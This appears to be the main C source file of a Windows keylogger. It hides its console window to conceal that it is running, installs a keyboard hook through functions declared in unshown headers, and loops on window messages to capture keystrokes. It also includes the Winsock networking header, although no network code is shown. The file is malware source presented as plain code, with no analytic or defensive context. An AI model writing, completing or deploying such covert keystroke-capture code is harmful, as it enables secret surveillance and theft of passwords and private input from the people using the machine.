#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include "hookManager.h"
#include "buffer.h"


int main(void)
{
    if(!initBuffer()) {
        return -1;
    }

    //Hiding program execution
    HWND hideWindow = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(hideWindow, 0);

    if(!installKeyboardHook()){
        return -1;
    }

    MSG Msg;
    while(GetMessage(&Msg, NULL, 0, 0)){
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    uninstallKeyboardHook();
    freeBuffer();

    return 0;
}



